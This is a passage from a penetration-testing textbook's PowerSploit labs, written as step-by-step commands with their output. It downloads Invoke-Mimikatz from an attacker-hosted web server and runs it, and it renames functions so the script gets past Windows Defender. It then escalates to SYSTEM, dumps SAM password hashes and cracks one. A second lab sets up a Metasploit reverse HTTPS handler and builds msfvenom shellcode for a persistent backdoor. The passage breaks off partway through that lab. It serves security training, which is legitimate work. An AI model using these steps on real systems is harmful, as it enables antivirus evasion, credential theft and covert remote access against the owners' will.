
utilities that help you identify weak permissions that can be exploited, to tools that actually do some of the work for you. We’ll take a look at how to use some of these tools later in the chapter.

Although it doesn’t help in exploiting the system in any way, the Recon directory contains tools that can help you better understand the environment in which you’re working. These tools are handy for gathering basic information, port scanning, and getting information about domains, servers, and workstations. They can help you identify what you want to target, as well as help you build profiles for what exists in an environment.

## Lab 15-6: Running Mimikatz Through PowerShell

One of the amazing features of PowerSploit is the ability to invoke Mimikatz through PowerShell. To do this, we have to call the Invoke-Mimikatz.ps1 script out of the Privesc folder. Let’s give it a shot:

```
PS C:\Users\User> iex (iwr -UseBasicParsing ^
http://192.168.1.92/ps/Exfiltration/Invoke-Mimikatz.ps1 )
```

No error messages pop up when we run it, but a few seconds later, we see a Windows Defender pop-up indicating that the script has been flagged as malicious. When we try to run Invoke-Mimikatz after we’ve loaded the script, it’s not defined. Therefore, we have to do some work to make this function. We’re going to use some of the work done by Black Hills Security to bypass AV and make the script load.2 Let’s start with deleting some spaces and comments from our web root (/var/www/html/ps/Exfiltration) in Kali:

```
# sed -i -e '//#/,/#>/c\' Invoke-Mimikatz.ps1
# sed -i -e 's/^[[[:space:]]]*.*.$/g' Invoke-Mimikatz.ps1
```

Now we can go back to our Windows box and try it again:

```
PS C:\Users\User> iex (iwr -UseBasicParsing `
http://192.168.1.92/ps/Exfiltration/Invoke-Mimikatz.ps1 )
iex : At line:1 char:1
+ function Invoke-Mimikatz
+
~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ iex (iwr -UseBasicParsing http://192.168.1.92/ps/Exfiltration/Invoke- ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression],
ParseException + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.
Commands.InvokeExpressionCommand
```

We got a bit further this time, but we still see that the script was blocked. We’re going to have to make some additional changes to make it work. In Kali, let’s change the function names around to see if we can fool the security controls that way:

```
# sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
# sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
```

Here, we’ve renamed the main command as well as one of the subcommands. This should let us get around the AV that’s flagging the script as malicious based on function names. Let's try again:

```
PS C:\Users\User> iex (iwr -UseBasicParsing http://192.168.1.92/ps/Exfiltration/Invoke-Mimikatz.ps1 )
PS C:\Users\User> Invoke-Mimidogz

.####.  mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. "A La Vie, A L'Amour"
## / \ ## /* * *
## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)
'####' with 20 modules * * */
```

```
mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

```
mimikatz(powershell) # exit
Bye!
```

Our script loaded, and we were able to run Invoke-Mimidogz, but the default execution didn't get us anything. The default is to try to pull credentials from memory, which Windows 10 blocks. However, we can get information from Local Security Authority Subsystem Service (LSASS). We're going to have to run Invoke-Mimidogz with the - command flag to tell it to dump the lsadump::sam:

```
PS C:\Users\User> Invoke-Mimidogz -command lsadump::sam
```

```
.####.  mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. "A La Vie, A L'Amour"
## / \ ## /* * *
## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)
'####' with 20 modules * * */
```

```
mimikatz(powershell) # lsadump::sam
Domain : DESKTOP-KRB3MSI
SysKey : a34b3d05aec244baf6e966715bd6b6c9'
ERROR kuhl_m_registry_OpenAndQueryWithAlloc ; kuhl_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kuhl_m_registry_RegOpenKeyEx
SAM Accounts (0x00000005)
```

We see here that our privileges weren't high enough to get to the LSASS-owned file, so we're going to have to escalate. Fortunately, PowerSploit has a tool to allow us to do that as well. We'll use the Get-System.ps1 tool in Privesc to get a SYSTEM token so that we can access the SAM file:

```
PS C:\Users\User> iex (iwr -UseBasicParsing `
http://192.168.1.92/ps/Privesc/Get-System.ps1 )
PS C:\Users\User> Get-System
Running as: WORKGROUP\SYSTEM
PS C:\Users\User> Invoke-Mimidogz -command lsadump::sam
```

```
.#######.  mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. "A La Vie, A L'Amour"
## \ / ## /* * *
## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)
'######' with 20 modules * * */
```

```
mimikatz(powershell) # lsadump::sam
Domain : DESKTOP-KRB3MSI
SysKey : a34b3d05aec244baf6e966715bd6b6c9
Local SID : S-1-5-21-3929919845-4074983535-3314702914

SAMKey : cb8862eca7c79e1cc72f3309745d07a

RID : 000001f4 (500)
User : Administrator
LM :
NTLM :

RID : 000003e9 (1001)
User : User
LM :
NTLM : 64f12cddaa88057e06a81b54e73b949b
```

Here we load our Get-System.ps1 file from the Privesc directory of PowerSploit. Then, when we run Get-System, it gets a token for the SYSTEM user. The SYSTEM user has the ability to access the SAM file through LSA. This time, when we run the Invoke-Mimidogz script and ask for our lsadump::sam, it's successful. We can see the NTLM hash for User. We can copy that and then take it over to our Kali box and crack it with John the Ripper:

```
# echo 64f12cddaa88057e06a81b54e73b949b > creds.txt
# john --format=NT creds.txtUsing default input encoding: UTF-8
Rules/masks using ISO-8859-1
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1         (?)
1g 0:00:00:00 DONE 2/3 (2017-11-09 17:46) 14.28g/s 53142p/s
53142c/s 53142C/s woodrow..Secret
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

When we run John against our creds.txt file, we see that the password for User is Password1. We have successfully changed Invoke-Mimikatz so that it won't be blocked by AV, and we ran Get-System to get a SYSTEM token so that we could use Mimikatz to dump credentials out of the LSASS process. We were able to do all these tasks using just PowerShell, so no additional binaries were left on the system.

## Lab 15-7: Creating a Persistent Meterpreter Using PowerSploit

During a penetration test, one of the things you might need to do is create a persistent backdoor. For this lab, we’re going to look at how to load shellcode with PowerSploit and then how to use PowerSploit to make our access persistent across reboots. The first step in the process is making sure you understand how to load Meterpreter using PowerSploit.

We will be using the Invoke-Shellcode module as part of the CodeExecution directory. We’re also going to set up our Meterpreter callback using Metasploit. Let’s do the groundwork for the process by setting up our Meterpreter callback handler. We are going to use a reverse_https payload. This payload is most likely to avoid detection by AV and other security controls because it uses a common protocol and it calls back to us from inside the target’s network.

```
root@kali:~# msfconsole -q
msf > use multi/handler
msf exploit(handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.1.92
LHOST => 192.168.1.92
msf exploit(handler) > exploit
```

[*] Started reverse HTTPS handler on 192.168.1.92:8443
[*] Starting the payload handler...

Now that our callback is set up, let’s generate the shellcode to go with it. The PowerSploit module takes shellcode in the format 0x00 (instead of the \x00 convention of most languages). We’re going to create some shellcode and then perform some conversions. We use msfvenom to generate our payload and then do some additional scripting to clean it up:

```
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_https --format c \
LHOST=192.168.1.92 | tr -d "\n\"|" | sed -e 's/\\x/,0x/g' \
| cut -f 2- -d ','
```

When we generate our payload, we specify that the C format should be used. Because the output won’t look right for us, we’re going to use tr to delete new lines, double quotes, and semicolons from the output. Next, we take every occurrence of \x and change it to ,0x so that we can have our delimiter and the 0x that’s required before each hex character. Finally, we’ll have the variable declaration and an extra comma in our output, so we’re going to cut the output on that first command and take everything after it. We’ll copy this shellcode and then go over to our Windows box, load up PowerShell as a regular user instead of as Administrator, and load our Invoke-Shellcode.ps1 file from the web server:
